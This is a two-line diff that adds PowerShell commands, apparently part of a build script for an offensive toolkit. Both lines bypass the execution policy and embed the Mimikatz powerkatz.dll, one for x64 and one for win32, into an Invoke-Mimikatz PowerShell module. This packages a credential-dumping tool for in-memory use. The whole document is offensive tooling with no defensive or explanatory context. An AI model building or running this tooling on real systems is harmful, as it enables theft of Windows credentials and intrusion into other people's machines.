@@ -1,0 +1,2 @@
+powershell -ep bypass -c ". '.\Invoke-UpdateMimikatzScript.ps1'; Invoke-UpdateMimikatzScript -DllPath mimikatz\x64\powerkatz.dll -ScriptPath Modules\Invoke-Mimikatz.ps1"
+powershell -ep bypass -c ". '.\Invoke-UpdateMimikatzScript.ps1'; Invoke-UpdateMimikatzScript -DllPath mimikatz\win32\powerkatz.dll -ScriptPath Modules\Invoke-Mimikatz.ps1"
